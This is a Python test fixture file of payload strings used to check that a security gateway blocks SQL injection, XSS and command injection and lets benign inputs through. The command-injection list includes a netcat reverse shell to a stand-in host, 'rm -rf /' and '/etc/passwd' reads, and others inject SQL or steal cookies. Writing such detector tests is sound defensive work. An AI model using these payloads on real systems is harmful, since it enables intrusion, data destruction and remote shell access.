"""
tests/payloads.py
==================

Shared attack-payload fixtures for exercising the Security Gateway
(security.gateway.process_request) and its underlying detectors
(security.sanitizers). Owned jointly by Security (Member B) and QA
(Member D) per docs/Rules.md, Section 8.

Payloads here are the same well-known, publicly documented signatures
used throughout security testing and education (OWASP's Testing Guide,
common WAF test suites) -- short strings used purely to verify
pattern-matching logic. Nothing in this file executes; it is inert
test data, not working exploit code.

Layout
------
SQLI_PAYLOADS, XSS_PAYLOADS, CMDI_PAYLOADS:
    Malicious inputs that `process_request` MUST block, grouped by the
    attack_type it should report for them.

SAFE_PAYLOADS:
    Ordinary, legitimate-looking inputs that must NOT be blocked -- a
    regression net against false positives on real user data (including
    a few deliberately tricky cases: an apostrophe in a real name, "or"
    used as an ordinary conjunction, punctuation with no command after it).

ATTACK_PAYLOADS:
    The three attack lists keyed by attack_type, for parametrized
    iteration, e.g.:

        from security.gateway import process_request
        from tests.payloads import ATTACK_PAYLOADS, SAFE_PAYLOADS

        for attack_type, payloads in ATTACK_PAYLOADS.items():
            for payload in payloads:
                result = process_request(data={"username": "u", "password": payload})
                assert result["is_blocked"] is True
                assert result["attack_type"] == attack_type

        for safe_value in SAFE_PAYLOADS:
            result = process_request(data={"username": "u", "password": safe_value})
            assert result["is_blocked"] is False
"""
from __future__ import annotations

from typing import Dict, List

SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR 'a'='a",
    "1' UNION SELECT username, password FROM users--",
    "'; DROP TABLE users;--",
    "' OR SLEEP(5)--",
    "1 AND 1=1",
    "' AND '1'='1' /*",
    "x' AND SUBSTRING(username,1,1)='a",
]

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
    "<body onload=alert('XSS')>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
]

CMDI_PAYLOADS: List[str] = [
    "; ls -la",
    "| whoami",
    "`id`",
    "$(cat /etc/passwd)",
    "&& cat /etc/passwd",
    "; rm -rf /",
    "127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
    "test && powershell -Command Get-Process",
]

# Legitimate inputs that must be allowed through unmodified, so the
# gateway doesn't punish real users for normal credentials/free text.
SAFE_PAYLOADS: List[str] = [
    "admin",
    "j.smith92",
    "Correct-Horse-Battery-Staple!42",
    "O'Brien",  # apostrophe in a real name -- must not trigger SQLi rules
    "P@ssw0rd; keep it secret",  # semicolon in free text, no command follows
    "5 or 6 people attended",  # contains "or" but no tautology
    "I'll bring cats & dogs",  # ampersand, no command keyword after it
    "team@example.com",
    "notes: select the best option from the list",  # "select"/"from" but as prose
]

ATTACK_PAYLOADS: Dict[str, List[str]] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
}
